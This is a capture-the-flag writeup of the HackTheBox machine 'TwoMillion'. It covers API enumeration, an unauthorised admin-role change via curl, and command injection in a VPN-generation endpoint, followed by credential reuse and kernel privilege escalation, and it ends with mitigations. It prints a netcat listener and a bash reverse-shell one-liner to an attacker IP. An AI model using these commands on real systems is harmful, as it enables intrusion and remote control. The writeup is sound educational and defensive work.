---
title: "Writeup: HTB TwoMillion"
description: "Writeup and solution to the HackTheBox machine entitled 'TwoMillion'. In this writeup, we describe the vulnerabilities that allow the initial foothold and privilege escalation, and propose a set of mitigations."
locale: "en-us"
pubDate: "06 Dec 2025"
tags:
  - Writeup
  - HackTheBox
  - Web
  - API
  - Enumeration
  - Command Injection
---

## TL;DR

"Two Million" is a hacking challenge on the HackTheBox security platform. The challenge involves API enumeration, command injection, local enumeration, and privilege escalation. The kill chain consists of the following steps:

1. Using unauthenticated API endpoints, we gain elevated privileges inside the web application.
2. Using vulnerable API endpoints, we gain command execution capability.
3. Using insecure credentials, we gain user access to the machine.
4. Using a vulnerability in the Overlay File System, we elevate our privileges and gain root access.

In order to mitigate the vulnerabilites, the API should implement authentication, authorization, and sanitization. Additonally, the Overlay File System vulnerability can be mitigated by patching the system with a more recent version, or by applying the recommended mitigations detailed in the associated CVE.

## The machine

Using Nmap we can see that the machine only exposes an SSH server and an HTTP server, on ports 22 and 80 respectively. The machine is a simple web server, that provides a simplified reproduction of the HackTheBox web application.

Multiple pages are available, as well as simple invite and login features, which allow inviting users to the platform and to log in. However, the invitation requires an access code.

## Accessing the web application

On the invite page, we notice that the server sends out a JavaScript file that might contain the client code used to generate an invite code, `inviteapi.min.js`.

```js
eval(
  (function (p, a, c, k, e, d) {
    e = function (c) {
      return c.toString(36);
    };
    if (!"".replace(/^/, String)) {
      while (c--) {
        d[c.toString(a)] = k[c] || c.toString(a);
      }
      k = [
        function (e) {
          return d[e];
        },
      ];
      e = function () {
        return "\\w+";
      };
      c = 1;
    }
    while (c--) {
      if (k[c]) {
        p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]);
      }
    }
    return p;
  })(
    '1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,
    24,
    "response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify".split(
      "|"
    ),
    0,
    {}
  )
);
```

This code is quite obviously obfuscated, but using a simple deobfuscator like [de4j](https://lelinhtinh.github.io/de4js/) reveals the initial JavaScript code:

```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

We understand that, using the `/api/v1/invite/how/to/generate` endpoint, a user can generate an invite code. By hitting that endpoint and decoding the base64 answer, we obtain an invite code that can be used in the "join" page of the web application to create an account.

## Gaining administrator role

To look deeper into the web application's API, we can use the `/api/v1` endpoint to list the entire structure of the API:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": { "/api/v1/admin/auth": "Check if user is admin" },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": { "/api/v1/admin/settings/update": "Update user settings" }
    }
  }
}
```

We see multiple endpoints available, with some endpoints belonging to the `admin` category. To gain administrator access, we can use the `/api/v1/admin/settings/update` endpoint, which does not require proper authorization.

Using `curl`, we can send a simple request, modifying our user role to an administrator role:

```bash
curl http://2million.htb/api/v1/admin/settings/update -X PUT -d '{"email":"heimdall@gmail.com","is_admin":1}' -b PHPSESSID=dr6fgsjugvlope5vgudu3krn65 -H "Content-Type: application/json"
```

## Initial foothold

With our newly found administrator access, we can use the `/api/v1/admin/vpn/generate` endpoint, which is used to generate new VPN credentials, to perform command injection. Because this command requires generating new cryptographic keys, it is highly likely that it performs some operations on the operating system, such as using `openssl`. When querying the endpoint, we notice that the API takes in a user input, the username field. Using this field, we can execute simple commands on the host. Using Netcat, we can start a listener on our local machine:

```bash
nc -lvp 1234
```

Then send the following payload through the HTTP request to obtain a reverse shell:

```bash
bash -i >& /dev/tcp/10.10.14.4/1234 0>&1
```

## Local enumeration

Looking through the web folder where the files are stored (`/var/www/html`), we see that developers have included an environment variable file, `.env`, which contains credentials for a SQL database. Using those credentials on the SSH server allows us to gain a secure shell to the machine with the `admin` user.

Looking further into the machine, we find a local storage of emails in the `/var/mail/admin` directory. Because we are now authenticated as `admin`, we can take a look at the emails without further verification.

We see that one of the emails mentions a so-called "nasty" vulnerability regarding the OverlayFS, which we will investigate for privilege escalation.

## Privilege escalation

A quick look through the CVE database yields a promising vulnerability, as mentioned in the leaked emails: [CVE-2023-0386](https://www.cve.org/CVERecord?id=CVE-2023-0386). Using an out-of-the-box [proof of concept](https://github.com/xkaneiki/CVE-2023-0386) for the vulnerability allows us to gain root privileges and retrieve the flag.

## Mitigations

### API

The API lacks proper authorization on all endpoints. Endpoints used to generate invitation codes hould be available only to authenticated users, and possibly only to administrators, depending on the business logic of the application. Endpoints used to elevate users to the administrator role should also only be accessible to administrator users. This can be achieved by implementing more extensive security checks in the API's logic.

Additionally, user input should always be sanitized, especially when the input will be executed within a shell environment.

### OverlayFS

The vulnerability that allowed privilege escalation was due to a bug in the OverlayFS feature of the Linux kernel. To remediate the vulnerability, ensure your Linux systems are running a patched kernel version.
